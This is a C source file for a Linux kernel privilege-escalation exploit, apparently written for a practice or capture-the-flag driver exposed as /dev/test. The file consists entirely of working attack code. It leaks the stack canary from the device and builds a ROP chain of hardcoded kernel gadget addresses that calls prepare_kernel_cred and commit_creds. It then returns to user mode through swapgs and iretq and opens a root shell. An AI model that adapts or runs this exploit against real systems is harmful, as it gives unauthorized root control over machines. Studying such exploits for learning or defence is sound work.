//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
}

void shell() {
    execl("/bin/sh", "sh", NULL);
}

int main() {
    int fd;
    size_t rop[20] = {0, };
    size_t *canary[2] = {0, };
    int i = 0;
    
    void *commit_creds = 0xffffffff8108e9f0;
    void *prepare_kernel_cred = 0xffffffff8108ec20;

    fd = open("/dev/test", O_RDWR);

    read(fd, canary, sizeof(canary));
    printf("canary = %lx\n", canary[1]);

    backup_rv();

    rop[i++] = 0x4141414141414141;
    rop[i++] = canary[1];
    rop[i++] = 0x4141414141414141;
    rop[i++] = 0x4141414141414141;
    rop[i++] = 0x4141414141414141;
    rop[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = 0xffffffff813f4eca;    // pop rcx; ret;
    rop[i++] = 0;
    rop[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;
    rop[i++] = commit_creds;
    rop[i++] = 0xffffffff81c00f58;    // swapgs; ret;
    rop[i++] = 0xffffffff810252b2;    // iretq; ret;
    rop[i++] = &shell;
    rop[i++] = rv.user_cs;
    rop[i++] = rv.user_rflags;
    rop[i++] = rv.user_rsp;
    rop[i++] = rv.user_ss;

    write(fd, rop, sizeof(rop));

    close(fd);

    return 0;
}
